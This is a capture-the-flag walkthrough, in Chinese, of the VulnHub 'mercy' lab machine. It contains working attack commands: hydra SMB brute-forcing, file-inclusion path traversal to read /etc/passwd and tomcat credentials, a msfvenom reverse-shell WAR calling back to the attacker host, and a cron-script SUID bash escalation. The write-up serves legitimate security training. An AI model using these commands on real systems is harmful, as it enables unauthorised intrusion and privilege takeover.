# 前言

靶机：`digitalworld.local-mercy`，IP地址为`192.168.10.11`

攻击：`kali`，IP地址为`192.168.10.6`

`kali`采用`VMware`虚拟机，靶机选择使用`VMware`打开文件，都选择桥接网络

这里官方给的有两种方式，一是直接使用`virtualbox`加载，另一种是通过`VMware`直接加载，也给出了`iso`镜像文件。

> 文章中涉及的靶机，来源于`vulnhub`官网，想要下载，可自行访问官网下载，或者通过网盘下载

# 主机发现

使用`arp-scan -l`或`netdiscover -r 192.168.10.1/24`扫描

也可以使用`nmap`等工具进行

![](pic-mercy\1.jpg)

# 信息收集

## 使用nmap扫描端口

扫描`tcp`端口，并保存于`nmap-tcp`

```shell
nmap -sT 192.168.10.11 --min-rate=1000 -p- -oA nmap-tcp
```

![](pic-mercy\2.jpg)



扫描常见的20个`udp`端口，不过这里的端口明显处于`open`的很少

```shell
nmap -sU 192.168.10.11 --top-ports 20 -T4 -oA nmap-udp
```

![](pic-mercy\3.jpg)

把前面扫描出的`tcp、udp`端口，进行处理，只取端口号

```shell
grep open nmap-tcp.nmap | awk -F'/' '{print $1}' | paste -sd ','
grep open nmap-udp.nmap | grep -v "open|filtered" | awk -F'/' '{print $1}' | paste -sd ','
#这里就是包括可能开放的端口都不要，因为是靶机，可能过滤的话，也会无法进一步扫描
ports=53,110,139,143,445,993,995,8080,123,137
```

![](pic-mercy\4.jpg)

对特定的端口号进行深入探测

```shell
nmap -sV -O -sC -sT 192.168.10.11 -p $ports -oA detail
```

![](pic-mercy\5.jpg)

![6](pic-mercy\6.jpg)

![7](pic-mercy\7.jpg)

对特定的端口号进行漏洞检测，前面端口的检测，基本上都是在中间人攻击时，数据传输的问题

这里对于`http`服务进行了简单的枚举

```shell
nmap --script=vuln 192.168.10.11 -p $ports -oA vuln
```

![](pic-mercy\8.jpg)



## 网站信息收集

还是从网站开始下手进行

访问8080端口的界面，查看页面源代码，无信息暴露，不过在文章最后提到两个地址，是可以访问的，不过需要认证，也就是登录

![](pic-mercy\9.jpg)

访问`manager`界面

![](pic-mercy\10.jpg)

访问`host-manager`界面

![](pic-mercy\11.jpg)

使用`gobuster`进行目录爆破，也可以使用其他工具，如`dirb、dirsearch`等

```shell
gobuster dir -u http://192.168.10.11:8080 -w /usr/share/wordlists/dirb/big.txt -x php,bak,txt,js,html -b 403-404
```

![](pic-mercy\12.jpg)

与之前使用`nmap`脚本时，枚举的差不多，这里主要就是`robots.txt`文件

访问`robots.txt`文件，发现一个路径

![](pic-mercy\13.jpg)

访问`/tryharder/tryharder`，发现是某种编码处理后的数据

![](pic-mercy\14.jpg)

根据特性，可能是`base64`编码，使用命令进行解码处理

```shell
echo 'SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==' | base64 -d 
```

![](pic-mercy\15.jpg)

这里可以看到，解码后是一段内容，主要就是弱密码的问题，这里提示`password`，就是弱密码了

这里尝试之前的两个界面去登录测试，发现并不可取，啧，直接进行爆破也是可以，不过暂时继续收集信息

## smb信息收集

使用`enum4linux`进行枚举，发现几个用户和共享

```shell
enum4linux -a 192.168.10.11
```

![](pic-mercy\16.jpg)

![17](pic-mercy\17.jpg)

使用`nmap`的脚本进行探测

```shell
nmap --script=smb* 192.168.10.11
```

![](pic-mercy\18.jpg)

![](pic-mercy\19.jpg)

根据已知信息，进行汇集

用户名有`pleadformercy、qiu、fluffy、thisisasuperduperlonguser`

密码有一个暴露的提示，不知是否可用`password`，不过这也提示可能是弱密码

现在无`ssh`服务，可以进行密码爆破的有两处，一个是`http`的基本认证和`smb`的爆破

# 漏洞寻找

先进行爆破测试，把之前获取的用户名保存在`user`文件

```shell
hydra -L user -P /usr/share/wordlists/fasttrack.txt -e nsr 192.168.10.11 smb
```

![](pic-mercy\20.jpg)

这里可以看到，爆破出的密码和给出的密码是一样的，都是`password`

以这个账户去登录测试

```shell
smbclient //192.168.10.11/qiu -U qiu
```

![](pic-mercy\21.jpg)

把所有内容下载到`kali`中

```shell
prompt		#关闭交互，这样下载时，默认选择yes
recurce		#开启递归，把文件夹中的文件也会下载
mget *		#下载所有内容
```

![](pic-mercy\22.jpg)

![23](pic-mercy\23.jpg)

查看所有文件，寻找有无可用信息

访问`.private`目录时，发现有信息，这里可能有东西

![](pic-mercy\24.jpg)

# 关键配置文件泄露

最终在`opensesame`目录下的`config`文件发现好多配置

首先就是端口的开启与关闭，采用开门的形式，这里是对`http`80端口和`ssh`22端口的配置

![](pic-mercy\25.jpg)

先开启吧，这里可以使用`knock`或`nc`按照序列即可开启端口

```shell
nc 192.168.10.11 159
nc 192.168.10.11 27391
nc 192.168.10.11 4
```

![](pic-mercy\26.jpg)

再开启`22`端口，一定要按照序列的顺序

```shell
knock 192.168.10.11 17301 28504 9999
```

![](pic-mercy\27.jpg)

后面的配置信息都是`apache2`和`smb`的一些信息，并未透露什么敏感信息

那么访问80端口，只有这个信息，并且查看页面源代码也没有信息

![](pic-mercy\28.jpg)

和前面的`8080`端口网站一样，访问`robots.txt`文件试试有没有

![](pic-mercy\29.jpg)

发现两个路径`/mercy、nomercy`，访问`mercy`，发现是一段话，并且可能无用

![](pic-mercy\30.jpg)

访问`nomercy`，这可能是一个`cms`，并且在测试时，点击按钮无反应，并且界面中显示出了可能是`cms`的名称和版本信息

![](pic-mercy\31.jpg)

使用`whatweb`进行探测，确实如此

```shell
whatweb http://192.168.10.11/nomercy
```

![](pic-mercy\32.jpg)

# 漏洞利用

使用`searchsploit`搜索有无漏洞可利用，有一个

![](pic-mercy\33.jpg)

查看这个文档，两个可能，不过看来都像是文件包含

![](pic-mercy\34.jpg)

一个个的测试，先测试`/windows/code.php`

```shell
http://192.168.10.11/nomercy/windows/code.php?file=../../../../../../etc/passwd
```

![](pic-mercy\35.jpg)

这个也行，但是显示结果只有一行

```shell
http://192.168.10.11/nomercy/windows/function.php?file=../../../../../../etc/passwd
```

![](pic-mercy\36.jpg)

尝试进行远程文件包含测试，发现并不行，虽然远程文件是包含了，但是作为`php`相当于没有被解析

目前还有个`8080`端口的配置文件可以包含查看一下，其他文件尝试包含并不行

之前在8080端口的默认网站的最下面，提示到了这个用户方面的配置文件的位置`/etc/tomcat7/tomcat-users.xml`

直接包含这个文件进行查看，获取两组，不过从配置来看`thisisasuperduperlonguser`权限更大

![](pic-mercy\37.jpg)

| 用户名                    | 密码                   |
| ------------------------- | ---------------------- |
| thisisasuperduperlonguser | heartbreakisinevitable |
| fluffy                    | freakishfluffybunny    |

# 通过war文件反弹shell

登录后，发现有部署`war`文件，那么就需要测试

![](pic-mercy\38.jpg)

使用`msfenvm`生成一个脚本

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.10.6 LPORT=9999 -f war -o shell.war
```

在`kali`中使用`nc`监听对应的端口

```shell
nc -lvnp 9999
```

然后部署后，点击部署的名称`shell`，即可获取到反弹`shell`

![](pic-mercy\40.jpg)

# 水平提权

在这里折腾了一会，就没截图，直接切换`fluffy`用户，所用的密码就是在`tomcat`的配置文件中发现的两组用户，为什么能切换，首先就是确认了系统中有这个用户，然后就是测试是否存在一个密码多用的情况

![](pic-mercy\41.jpg)

在`fluffy`的家目录下的一个文件夹中，发现一个疑似定时任务的脚本，所属者为`root`，并且这个文件别人是可以修改的

![](pic-mercy\42.jpg)

就先添加一句，因为目前不确定

```shell
echo "chmod +s /bin/bash" >> timeclock
```

# 靶机内信息收集

收集系统内核及系统版本

```shell
uname -a/-r
cat /etc/issue
cat /etc/*release
```

![](pic-mercy\43.jpg)

查看网络连接状态

```shell
ip add
ss -antlp
```

![](pic-mercy\44.jpg)

查看以`root`执行的进程

```shell
ps aux | grep root
```

![](pic-mercy\45.jpg)

上传`pspy64`脚本，发现无法执行，上传`les.sh`脚本，发现几个可能性高的漏洞

![](pic-mercy\46.jpg)

![](pic-mercy\47.jpg)

但是因为靶机内没有`gcc`或`cc`，所以我测试前面可能性较高的都无法执行后，就放弃了

使用`find`寻找具有SUID权限的文件

```shell
find / -perm -u=s -type f 2>/dev/null
```

![](pic-mercy\48.jpg)

# 垂直提权至root

这里测试`sudo -l`也是对当前用户无用的，这里的`/bin/bash`让我确信，是前面的定时脚本任务执行了

```shell
echo "chmod +s /bin/bash" >> timeclock
```

就是这个在前面先输入进去的

执行语句进行提权，然后查看`/root`下的证明

```shell
/bin/bash -p
```

![](pic-mercy\49.jpg)

# 总结

该靶机考察以下几点：

1. 一个常见的`robots.txt`泄露敏感目录
2. 常见的编码，这里是`base64`
3. `smb`服务的连接，以及文件的下载
4. 端口敲门服务，需要特定的序列顺序
5. 识别`cms`并得知其漏洞，这里就是文件包含漏洞，但是配合`tomcat`的用户配置文件的位置泄露，导致获取到关键信息
6. 对于`tomcat`的`war`文件部署，通过`msfvenom`生成脚本文件，并获取反弹`shell`
7. 水平提权时，用户可能存在一码多用的情况
8. 提权至`root`时，收集到一个疑似定时任务的脚本，尝试写入语句，最终成功执行了。不过这里没找到定时任务的内容，啧。





